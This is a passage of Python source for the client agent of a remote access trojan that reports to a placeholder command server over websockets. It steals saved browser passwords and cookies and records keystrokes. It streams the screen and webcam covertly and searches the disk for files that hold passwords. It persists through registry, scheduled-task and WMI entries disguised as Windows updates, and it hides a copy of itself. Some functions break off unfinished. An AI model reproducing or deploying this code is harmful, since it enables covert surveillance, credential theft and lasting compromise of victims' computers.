                        elif 'Firefox' in json_file:
                            browser_name = 'Firefox'
                        elif 'Brave' in json_file:
                            browser_name = 'Brave'
                        else:
                            browser_name = 'Unknown'
                    
                    for login in data.get('logins', []):
                        all_logins.append({
                            'browser': browser_name,
                            'profile': login.get('profile', 'Default'),
                            'url': login.get('url', ''),
                            'username': login.get('username', ''),
                            'password': login.get('password', '')
                        })
                    
                    for cookie in data.get('cookies', []):
                        all_cookies.append({
                            'browser': browser_name,
                            'profile': cookie.get('profile', 'Default'),
                            'domain': cookie.get('host', ''),
                            'name': cookie.get('name', ''),
                            'value': cookie.get('value', '')[:80]
                        })
                        
                except Exception as e:
                    await self.ws.send(json.dumps({
                        "type": "browser_creds_status",
                        "msg": f"⚠️ Error reading {json_file}: {str(e)[:100]}"
                    }))
            
            formatted_results = []
            
            for login in all_logins:
                formatted_results.append({
                    'browser': login.get('browser', 'Unknown'),
                    'profile': login.get('profile', 'Default'),
                    'url': login.get('url', ''),
                    'username': login.get('username', ''),
                    'password': login.get('password', '')
                })
            
            for cookie in all_cookies[:30]:
                formatted_results.append({
                    'browser': cookie.get('browser', 'Unknown'),
                    'profile': cookie.get('profile', 'Default'),
                    'url': cookie.get('domain', ''),
                    'username': '🍪 COOKIE',
                    'password': f"{cookie.get('name', '')}={cookie.get('value', '')}"
                })
            
            total_logins = len(all_logins)
            total_cookies = len(all_cookies)
            
            # Очистка временных файлов
            try:
                if os.path.exists(exe_path):
                    os.remove(exe_path)
                if os.path.exists(output_file):
                    os.remove(output_file)
            except:
                pass
            
            await self.ws.send(json.dumps({
                "type": "browser_creds_result",
                "data": formatted_results,
                "status": console_output[:10000] if console_output else stdout,
                "msg": f"✅ Found {total_logins} passwords, {total_cookies} cookies from {len(json_files)} browser(s)"
            }))
            
        except Exception as e:
            await self.ws.send(json.dumps({
                "type": "error",
                "msg": f"Browser credentials error: {str(e)}"
            }))

    async def connect(self):
        self.log("Agent startup. Connecting to the server...")
        self.ensure_copy_exists()
        if AUTO_PERSIST:
            try:
                self.log(f"AutoPersist..: {AUTO_PERSIST}")
                if AUTO_PERSIST == "registry":
                    await self.persist_add("WindowsUpdate")
                elif AUTO_PERSIST == "schtask":

                    await self.persist_schtask_add("WindowsUpdateTask", "minutes", interval_minutes=30, run_as_system=False)
                elif AUTO_PERSIST == "startup":
                    await self.persist_startup_folder_add("WindowsUpdate")
                elif AUTO_PERSIST == "wmi":
                    await self.persist_wmi_add("WmiUpdate", 30)
                elif AUTO_PERSIST == "service":
                    await self.persist_service_add("WindowsUpdateSvc")
            except Exception as e:
                self.log(f"Autopersist Error: {e}")
        while self.running:
            try:
                self.ws = await websockets.connect(
                    f"ws://SERVER_IP:SERVER_PORT",
                    ping_interval=20,
                    ping_timeout=60,
                    close_timeout=10,
                    max_size=524288000
                )
                self.log("Success reconnect to server!")
                await self.register()
                await self.receive()
            except Exception as e:
                self.log(f"Lost Conn: {e}. Recon in 5s...")
                await asyncio.sleep(5)

    async def send_file_chunks(self, file_path, original_filename, msg_type):

            try:
                chunk_size = 2 * 1024 * 1024  
                file_size = os.path.getsize(file_path)
                total_chunks = (file_size + chunk_size - 1) // chunk_size
                
                with open(file_path, "rb") as f:
                    for i in range(total_chunks):
                        chunk_data = f.read(chunk_size)
                        await self.ws.send(json.dumps({
                            "type": msg_type,
                            "filename": original_filename,
                            "chunk_index": i,
                            "total_chunks": total_chunks,
                            "data": base64.b64encode(chunk_data).decode(),
                            "agent_id": self.agent_id
                        }))
                        await asyncio.sleep(0.01) 
            except Exception as e:

    async def register(self):
        geo_data = await asyncio.to_thread(self.get_geolocation)
        
        os_version = f"{platform.system()} {platform.release()}"
        
        if sys.platform == 'win32':
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                current_build = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
                
                build = int(current_build) if current_build.isdigit() else 0
                
                if build >= 22000:
                    if "Windows 10" in product_name:
                        product_name = product_name.replace("Windows 10", "Windows 11")
                    elif "Windows" in product_name and "11" not in product_name:
                        product_name = "Windows 11" + product_name.split("Windows")[-1]
                
                os_version = product_name.strip()
                
                winreg.CloseKey(key)
            except:
                pass
        
        info = {
            "id": self.agent_id,
            "type": "agent",
            "token": "AUTH_TOKEN",
            "name": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": os_version,
            "user": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            "arch": platform.machine(),
            "is_admin": self.check_admin(),
            "geo": geo_data
        }
        
        if USE_ENCRYPTION and AES_KEY:
            info["aes_key"] = AES_KEY
        info["disabled_modules"] = DISABLED_MODULES
        await self.ws.send(json.dumps(info))

    async def persist_add(self, key_name):
        if sys.platform != 'win32':
            await self.ws.send(json.dumps({"type": "error", "msg": "Persistence works only on Windows"}))
            return
        try:
            exe_path = self.get_target_path()  
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            await self.ws.send(json.dumps({"type": "result", "msg": f"[+] Added to Autorun: '{key_name}' -> '{exe_path}'"}))
        except Exception as e:
            await self.ws.send(json.dumps({"type": "error", "msg": f"Autorun Add Error: {e}"}))

    async def persist_remove(self, key_name):
        if sys.platform != 'win32':
            return
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, key_name)
            winreg.CloseKey(key)
            await self.ws.send(json.dumps({"type": "result", "msg": f"[+] Removed '{key_name}' from Autorun."}))
        except FileNotFoundError:
            await self.ws.send(json.dumps({"type": "result", "msg": f"[-] Key '{key_name}' not found in Autorun."}))
        except Exception as e:
            await self.ws.send(json.dumps({"type": "error", "msg": f"Autorun Remove Error: {e}"}))



    async def persist_schtask_add(self, task_name, trigger_type, interval_minutes=None, interval_hours=None, interval_days=None, run_as_system=True):

        if sys.platform != 'win32':
            await self.ws.send(json.dumps({"type": "error", "msg": "Task Scheduler works only on Windows"}))
            return
        
        try:
            exe_path = self.get_target_path()
            

            if trigger_type == "minutes" and interval_minutes:
                schtasks_trigger = f"/sc minute /mo {interval_minutes}"
                interval_display = f"every {interval_minutes} minute(s)"
            elif trigger_type == "hours" and interval_hours:
                schtasks_trigger = f"/sc hourly /mo {interval_hours}"
                interval_display = f"every {interval_hours} hour(s)"
            elif trigger_type == "days" and interval_days:
                schtasks_trigger = f"/sc daily /mo {interval_days}"
                interval_display = f"every {interval_days} day(s)"
            else:
                schtasks_trigger = "/sc minute /mo 30"
                interval_display = "every 30 minute(s)"
            

            remove_cmd = f'schtasks /delete /tn "{task_name}" /f'
            subprocess.run(remove_cmd, shell=True, capture_output=True, timeout=10)
            


            if run_as_system:
                run_as = '/ru "SYSTEM"'
                level_text = "SYSTEM"
            else:

                run_as = ''
                level_text = "Current User"
            
            cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" {schtasks_trigger} {run_as} /f'
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            
            result = subprocess.run(
                cmd,
                shell=True, capture_output=True, text=True, timeout=30,
                startupinfo=startupinfo, creationflags=creationflags
            )
            

            if result.returncode == 0:

                if trigger_type == "minutes" and interval_minutes:
                    mod_cmd = f'schtasks /change /tn "{task_name}" /ri {interval_minutes}'
                    subprocess.run(mod_cmd, shell=True, capture_output=True, timeout=10,
                                  startupinfo=startupinfo, creationflags=creationflags)
                
                await self.ws.send(json.dumps({
                    "type": "result", 
                    "msg": f"[+] Scheduled task '{task_name}' created ({interval_display}) running as {level_text}"
                }))
            else:
                error_msg = result.stderr.strip() if result.stderr else result.stdout.strip()

                if "Access is denied" in error_msg and run_as_system:
                    await self.ws.send(json.dumps({
                        "type": "error", 
                        "msg": f"Access denied! Cannot create SYSTEM task without Administrator privileges.\nTry using 'Current User Task' option."
                    }))
                else:
                    await self.ws.send(json.dumps({
                        "type": "error", 
                        "msg": f"Task creation failed: {error_msg}"
                    }))
                
        except Exception as e:
            await self.ws.send(json.dumps({"type": "error", "msg": f"Schtask error: {str(e)}"}))

    async def persist_wmi_add(self, event_name, interval_minutes=30):

        if sys.platform != 'win32':
            await self.ws.send(json.dumps({"type": "error", "msg": "WMI works only on Windows"}))
            return
        
        try:
            exe_path = self.get_target_path()
            

            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            

            ps_cmd = f'''
            $filterName = "{event_name}_Filter"
            $consumerName = "{event_name}_Consumer"
            

            $query = "SELECT * FROM __InstanceModificationEvent WITHIN {interval_minutes} WHERE TargetInstance ISA 'Win32_ComputerSystem'"
            $filterArgs = @{{Name=$filterName; QueryLanguage="WQL"; Query=$query}}
            $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
            

            $consumerArgs = @{{Name=$consumerName; CommandLineTemplate="{exe_path}"; ExecutablePath="{exe_path}"}}
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
            

            $bindingArgs = @{{Filter=$filter; Consumer=$consumer}}
            $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_cmd],
                capture_output=True, text=True, timeout=30,
                startupinfo=startupinfo, creationflags=creationflags
            )
            
            if result.returncode == 0:
                await self.ws.send(json.dumps({"type": "result", "msg": f"[+] WMI subscription '{event_name}' created (every {interval_minutes} min)"}))
            else:
                error_msg = result.stderr[:200] if result.stderr else "Unknown error"
                await self.ws.send(json.dumps({"type": "error", "msg": f"WMI creation failed: {error_msg}"}))
        except Exception as e:
            await self.ws.send(json.dumps({"type": "error", "msg": f"WMI error: {str(e)}"}))

    async def persist_wmi_remove(self, event_name):

        if sys.platform != 'win32':
            return
        
        try:
            ps_cmd = f'''
            $filterName = "{event_name}_Filter"
            $consumerName = "{event_name}_Consumer"
            

            $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {{$_.Filter.Name -eq $filterName}}
            $bindings | ForEach-Object {{$_.Delete()}}
            

            $consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq $consumerName}}
            $consumers | ForEach-Object {{$_.Delete()}}

    async def start_keylogger(self, params):
        if not KEYLOGGER_ENABLED:
            await self.ws.send(json.dumps({"type": "error", "msg": "Keylogger module disabled in this build"}))
            return
        global keylogger_running, keylogger_queue, keylogger_main_loop, keylogger_listener, HAS_PYNPUT
        if not HAS_PYNPUT:
            await self.ws.send(json.dumps({"type": "error", "msg": "pynput not installed. Run: pip install pynput"}))
            return
        

        if keylogger_running:
            await self.stop_keylogger(params)
            await asyncio.sleep(0.5)  
        
        keylogger_queue = asyncio.Queue()
        keylogger_main_loop = asyncio.get_running_loop()
        

        def start_hook():
            global keylogger_listener, keylogger_running
            if keylogger_listener and keylogger_listener.is_alive():
                try:
                    keylogger_listener.stop()
                except:
                    pass
            keylogger_listener = keyboard.Listener(on_press=on_press)
            keylogger_listener.start()
            keylogger_running = True
            return True
        
        success = await asyncio.to_thread(start_hook)
        
        if success:
            self.keylogger_task = asyncio.create_task(self._send_keylog_loop())
            await self.ws.send(json.dumps({"type": "result", "msg": "[+] Keylogger started"}))
        else:
            await self.ws.send(json.dumps({"type": "error", "msg": "Failed to start keylogger"}))

    async def stop_keylogger(self, params):
        if not KEYLOGGER_ENABLED:
            await self.ws.send(json.dumps({"type": "error", "msg": "Keylogger module disabled in this build"}))
            return
        global keylogger_running, keylogger_queue, keylogger_listener
        if not keylogger_running:
            await self.ws.send(json.dumps({"type": "result", "msg": "Keylogger not running"}))
            return
        

        def stop_hook():
            global keylogger_listener, keylogger_running
            keylogger_running = False
            if keylogger_listener and keylogger_listener.is_alive():
                try:
                    keylogger_listener.stop()
                except:
                    pass
            keylogger_listener = None
        
        await asyncio.to_thread(stop_hook)
        

        if hasattr(self, 'keylogger_task') and self.keylogger_task:
            self.keylogger_task.cancel()
            try:
                await self.keylogger_task
            except asyncio.CancelledError:
                pass
            self.keylogger_task = None
        

        if keylogger_queue:
            while not keylogger_queue.empty():
                try:
                    keylogger_queue.get_nowait()
                except:
                    break
            keylogger_queue = None
        
        await self.ws.send(json.dumps({"type": "result", "msg": "[+] Keylogger stopped"}))
    #=== KEYLOGGER_END ===



    async def _send_keylog_loop(self):
        global keylogger_running, keylogger_queue
        while keylogger_running and keylogger_queue is not None:
            try:
                char = await asyncio.wait_for(keylogger_queue.get(), timeout=1.0)
                await self.ws.send(json.dumps({"type": "keylog_data", "data": char}))
            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"Keylog error: {e}")

    def _webcam_capture_thread(self, index):
        if not WEBCAM_ENABLED:
            return
        backend = cv2.CAP_DSHOW if sys.platform == 'win32' else cv2.CAP_ANY
        cap = cv2.VideoCapture(index, backend)
        
        if cap.isOpened():
            cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            while self.webcam_active and self.running:
                try:
                    ret, frame = cap.read()
                    if ret and frame is not None:
                        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                        self.latest_webcam_frame = base64.b64encode(buffer).decode()
                    time.sleep(0.04) 
                except:
                    break
        if cap: cap.release()

    async def start_webcam(self, index):

        self.latest_webcam_frame = None
        self.webcam_thread = threading.Thread(target=self._webcam_capture_thread, args=(index,), daemon=True)
        self.webcam_thread.start()
        
        async def send_frames():
            while self.webcam_active and self.running:
                if self.latest_webcam_frame:
                    try:
                        await self.ws.send(json.dumps({"type": "webcam_frame", "data": self.latest_webcam_frame}))
                        self.latest_webcam_frame = None
                    except:
                        self.webcam_active = False
                        break
                await asyncio.sleep(0.05) 
        asyncio.create_task(send_frames())

    async def start_stream(self, monitor=1):


        if self.streaming:
            self.streaming = False
            await asyncio.sleep(0.2)
        
        self.streaming = True
        self.current_stream_monitor = monitor
        
        try:
            data_ws = await websockets.connect(f"ws://SERVER_IP:SERVER_PORT")
            reg_msg = {"type": "data_channel", "id": self.agent_id, "token": "AUTH_TOKEN"}
            await data_ws.send(crypto.encrypt(json.dumps(reg_msg)) if USE_ENCRYPTION else json.dumps(reg_msg))
            
            last_frame_hash = None
            
            with mss.mss() as sct:
                while self.streaming and self.current_stream_monitor == monitor and self.running:

                    if monitor >= len(sct.monitors):
                        monitor = 1
                        self.current_stream_monitor = 1
                    
                    monitor_data = sct.monitors[monitor]
                    img = sct.grab(monitor_data)
                    pil_img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                    
                    buffer = io.BytesIO()
                    pil_img.save(buffer, format="JPEG", quality=60)
                    frame_bytes = buffer.getvalue()


                    import hashlib
                    new_hash = hashlib.md5(frame_bytes).hexdigest()
                    
                    if new_hash != last_frame_hash:
                        last_frame_hash = new_hash
                        msg = {"type": "frame", "data": base64.b64encode(frame_bytes).decode(), "agent_id": self.agent_id, "monitor": monitor}
                        payload = crypto.encrypt(json.dumps(msg)) if USE_ENCRYPTION else json.dumps(msg)
                        await data_ws.send(payload)
                    
                    await asyncio.sleep(0.05)  
                    
        except Exception as e:
            self.log(f"Stream error for monitor {monitor}: {e}")
        finally:
            self.streaming = False
            if 'data_ws' in locals():
                await data_ws.close()

    def ensure_copy_exists(self):

        try:
            target_path = self.get_target_path()
            

            if os.path.normcase(target_path) == os.path.normcase(sys.executable):
                return
            
            target_dir = os.path.dirname(target_path)

            if not os.path.exists(target_path):
                import shutil
                shutil.copy2(sys.executable, target_path)

                try:
                    ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)  
                except:
                    pass
                

                print(f"[+] Agent copied to: {target_path}")
                
        except Exception as e:
            print(f"[-] Copy failed: {e}")

    async def sysinfo(self):
        try:
            data = {}
            

            if sys.platform == 'win32':
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                    
                    product_name = winreg.QueryValueEx(key, "ProductName")[0]
                    current_build = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
                    

                    try:
                        build = int(current_build)
                        if build >= 22000:  
                            if "Windows 10" in product_name:
                                product_name = product_name.replace("Windows 10", "Windows 11")
                            elif "Windows" in product_name and "11" not in product_name:
                                product_name = product_name.replace("Windows", "Windows 11")
                            else:
                                product_name = f"Windows 11 {product_name.split('Windows')[-1]}".strip()

                    except:
                        pass
                    
                    data['os'] = product_name.strip()
                    data['build'] = current_build
                    

                    try:
                        ubr = winreg.QueryValueEx(key, "UBR")[0]
                        data['full_build'] = f"{current_build}.{ubr}"
                    except:
                        data['full_build'] = current_build
                        
                    winreg.CloseKey(key)
                    
                except Exception as reg_error:
                    data['os'] = f"{platform.system()} {platform.release()}"
                    data['build'] = "Unknown"
                    print(f"Registry read error: {reg_error}")
            else:
                data['os'] = f"{platform.system()} {platform.release()}"
                data['build'] = "N/A"
            

            data['arch'] = platform.machine()
            data['processor'] = platform.processor()
            data['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            

            data['cpu_cores'] = psutil.cpu_count(logical=True)
            freq = psutil.cpu_freq()
            data['cpu_freq'] = f"{freq.current:.2f} MHz" if freq else "Unknown"
            

            mem = psutil.virtual_memory()
            data['ram_total'] = f"{mem.total / (1024**3):.2f} GB"
            data['ram_used'] = f"{mem.used / (1024**3):.2f} GB ({mem.percent}%)"
            

            disks = []
            for part in psutil.disk_partitions(all=False):
                if os.name == 'nt' and ('cdrom' in part.opts or part.fstype == ''):
                    continue
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        'device': part.device,
                        'fstype': part.fstype,
                        'total': f"{usage.total / (1024**3):.2f} GB",
                        'used': f"{usage.used / (1024**3):.2f} GB",
                        'percent': f"{usage.percent}%"
                    })
                except:
                    pass
            data['disks'] = disks


            net_info = []
            try:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                            net_info.append(f"{interface}: {addr.address}")
            except:
                pass
            data['network'] = net_info


            if sys.platform == 'win32':
                try:
                    gpu_cmd = 'Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name'
                    gpus = subprocess.run(["powershell", "-Command", gpu_cmd], 
                                        capture_output=True, text=True, 
                                        creationflags=0x08000000).stdout.strip().split('\n')
                    data['gpus'] = [g.strip() for g in gpus if g.strip() and g.strip() != ""]


                    dev_cmd = "Get-PnpDevice -Class Media, Image, Camera, AudioEndpoint -Status OK | Select-Object -ExpandProperty FriendlyName"
                    devs = subprocess.run(["powershell", "-Command", dev_cmd], 
                                        capture_output=True, text=True, 
                                        creationflags=0x08000000).stdout.strip().split('\n')
                    data['devices'] = list(set([d.strip() for d in devs if d.strip()]))
                except:
                    data['gpus'] = []
                    data['devices'] = []
            else:
                data['gpus'] = []
                data['devices'] = []


            await self.ws.send(json.dumps({"type": "sysinfo_result", "data": data}))
            
        except Exception as e:
            print(f"Sysinfo error: {e}")
            fallback = {
                "os": f"{platform.system()} {platform.release()}",
                "arch": platform.machine(),
                "error": str(e)
            }
            await self.ws.send(json.dumps({"type": "sysinfo_result", "data": fallback}))

class PasswordsInFilesSearcher:
    def __init__(self, ws, agent_id):
        self.ws = ws
        self.agent_id = agent_id
        self.is_searching = False
        self.stop_requested = False
        self.scanned_count = 0
        self.last_status_time = 0
        self.all_keywords = []
        self.search_task = None
        self.speed_limit = 50
        self.search_in_content = True      
        self.search_in_filenames = True    

    def build_keywords(self, custom_word=""):

        keywords = set()
        
        if custom_word and custom_word.strip():
            custom = custom_word.strip()
            keywords.add(custom.lower())
            keywords.add(custom)
            if len(custom) > 3:
                keywords.add(f'"{custom}"')
            return list(keywords)
        
        for kw in PASSWORD_KEYWORDS:
            keywords.add(kw.lower())
            keywords.add(kw)
        
        return list(keywords)

    def filename_matches_keyword(self, filename, keywords):

        filename_lower = filename.lower()
        for keyword in keywords:
            if keyword.lower() in filename_lower:
                return True, keyword
        return False, None

    def is_binary_file(self, file_path, sample_size=1024):
        try:
            with open(file_path, 'rb') as f:
                chunk = f.read(sample_size)
                if b'\x00' in chunk:
                    text_characters = bytearray({7,8,9,10,12,13,27} | set(range(0x20, 0x100)) - {0x7f})
                    return bool(chunk.translate(None, text_characters))
            return False
        except:
            return True

    def get_drives(self, disk_option):
        drives = []
        if disk_option == "user":
            user_dirs = [
                os.path.expanduser("~\\Desktop"),
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Downloads"),
                os.path.expanduser("~\\Pictures"),
                os.path.expanduser("~\\Videos"),
                os.path.expanduser("~\\Music"),
                os.path.expanduser("~\\OneDrive"),
            ]
            for d in user_dirs:
                if os.path.exists(d):
                    drives.append(d)
        elif disk_option == "C:\\":
            drives = ["C:\\"]
        else:
            import string
            for drive_letter in string.ascii_uppercase:
                drive_path = f"{drive_letter}:\\"
                if os.path.exists(drive_path):
                    drives.append(drive_path)
        return drives

    async def send_status(self, message):
        try:
            await self.ws.send(json.dumps({
                "type": "passwords_in_files_status",
                "msg": message,
                "agent_id": self.agent_id
            }))
        except:
            pass

    async def send_result(self, matches):
        try:
            await self.ws.send(json.dumps({
                "type": "passwords_in_files_result",
                "matches": matches,
                "agent_id": self.agent_id
            }))
        except:
            pass

    async def stop(self):
        self.stop_requested = True
        self.is_searching = False
        if self.search_task and not self.search_task.done():
            self.search_task.cancel()
            try:
                await self.search_task
            except asyncio.CancelledError:
                pass
        await self.send_status("⏹ Search stopped by user.")
        self.search_task = None

    async def search_in_file_content(self, file_path, keywords, max_size_mb=10):

        if self.stop_requested or not self.is_searching:
            return []
        
        try:
            size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if size_mb > max_size_mb:
                return []
            
            if self.is_binary_file(file_path):
                return []
            
            encodings = ['utf-8', 'utf-8-sig', 'cp1251', 'cp1252', 'latin-1', 'cp866']
            content = None
            
            for enc in encodings:
                try:
                    with open(file_path, 'r', encoding=enc, errors='replace') as f:
                        content = f.read(1024 * 1024)  
                    break
                except:
                    continue
            
            if not content:
                return []
            
            if self.stop_requested or not self.is_searching:
                return []
            
            content_lower = content.lower()
            
            for keyword in keywords:
                if keyword.lower() in content_lower:

                    lines = content.split('\n')
                    for i, line in enumerate(lines):
                        if keyword.lower() in line.lower():
                            preview = line.strip()[:200]
                            return [{
                                'path': file_path,
                                'match_type': 'content',
                                'keyword': keyword,
                                'line': i + 1,
                                'preview': preview
                            }]
                    

                    return [{
                        'path': file_path,
                        'match_type': 'content',
                        'keyword': keyword,
                        'line': 0,
                        'preview': content[:200].strip()
                    }]
            
            return []
        except Exception:
            return []

    async def scan_directory(self, directory, keywords, max_size_mb, skip_binary):

        results = []
        files_processed_this_second = 0
        last_second_reset = time.time()
        
        try:
            for root, dirs, files in os.walk(directory):
                if self.stop_requested or not self.is_searching:
                    break
                

                skip_dirs = ['$Recycle.Bin', 'System Volume Information', 'Windows\\System32', 
                            'AppData\\Local\\Temp', 'Cache', 'caches', 'tmp', 'temp',
                            'Windows\\WinSxS', 'Windows\\Installer', '$Windows.~BT', '$Windows.~WS']
                should_skip = False
                for skip in skip_dirs:
                    if skip.lower() in root.lower():
                        should_skip = True
                        break
                if should_skip:
                    continue
                
                for file in files:
                    if self.stop_requested or not self.is_searching:
                        break
                    
                    now = time.time()
                    if now - last_second_reset >= 1.0:
                        files_processed_this_second = 0
                        last_second_reset = now
                    elif files_processed_this_second >= self.speed_limit:
                        await asyncio.sleep(0.02)
                        continue
                    
                    file_path = os.path.join(root, file)
                    files_processed_this_second += 1
                    

                    ext = os.path.splitext(file)[1].lower()
                    skip_exts = ['.exe', '.dll', '.sys', '.msi', '.cab', '.zip', '.rar', 
                                '.7z', '.gz', '.iso', '.mp3', '.mp4', '.avi', '.mkv', 
                                '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico']
                    
                    if ext in skip_exts:
                        continue
                    
                    self.scanned_count += 1
                    
                    current_time = time.time()
                    if current_time - self.last_status_time > 0.5:
                        self.last_status_time = current_time
                        await self.send_status(f"Scanning... found {len(results)} matches | scanned: {self.scanned_count}")
                    

                    filename_match_found = False
                    matched_keyword = None
                    
                    if self.search_in_filenames:
                        filename_match_found, matched_keyword = self.filename_matches_keyword(file, keywords)
                        
                        if filename_match_found:
                            results.append({
                                'path': file_path,
                                'match_type': 'filename',
                                'keyword': matched_keyword,
                                'line': 0,
                                'preview': f"[FILENAME MATCH] File name contains '{matched_keyword}'"
                            })
                            await self.send_result([{
                                'path': file_path,
                                'match_type': 'filename',
                                'keyword': matched_keyword,
                                'line': 0,
                                'preview': f"[FILENAME MATCH] File name contains '{matched_keyword}'"
                            }])
                            await asyncio.sleep(0.05)

                    

                    if self.search_in_content:
                        content_matches = await self.search_in_file_content(file_path, keywords, max_size_mb)
                        if content_matches:
                            results.extend(content_matches)
                            await self.send_result(content_matches)
                            await asyncio.sleep(0.05)
                    
                    if self.stop_requested or not self.is_searching:
                        break
        except Exception as e:
            print(f"Scan error: {e}")
        
        return results

    async def start_search(self, disk_option, custom_word, max_size_mb, skip_binary, speed_limit=50):
        self.is_searching = True
        self.stop_requested = False
        self.scanned_count = 0
        self.last_status_time = 0
        self.speed_limit = speed_limit
        self.search_in_content = True
        self.search_in_filenames = True
        
        await self.send_status(f" Starting password file search (speed: {speed_limit} files/sec)...")
        await self.send_status(f" Searching in: file CONTENT + file NAMES")
        
        keywords = self.build_keywords(custom_word)
        await self.send_status(f" Searching for {len(keywords)} keywords (including filename match)")
        
        drives = self.get_drives(disk_option)
        await self.send_status(f" Scanning {len(drives)} location(s)...")
        
        total_matches = 0
        filename_matches = 0
        content_matches = 0
        
        for drive in drives:
            if self.stop_requested or not self.is_searching:
                await self.send_status("⏹ Search stopped by user.")
                self.is_searching = False
                return
            
            await self.send_status(f" Scanning: {drive}")
            matches = await self.scan_directory(drive, keywords, max_size_mb, skip_binary)
            

            for m in matches:
                if m.get('match_type') == 'filename':
                    filename_matches += 1
                else:
                    content_matches += 1
            
            total_matches += len(matches)
        
        if not self.stop_requested and self.is_searching:
            await self.send_status(
                f" Search completed! Found {total_matches} matches total:\n"
                f"    Filename matches: {filename_matches}\n"
                f"    Content matches: {content_matches}\n"
                f"    Scanned {self.scanned_count} files total."
            )
        
        self.is_searching = False
        self.stop_requested = False
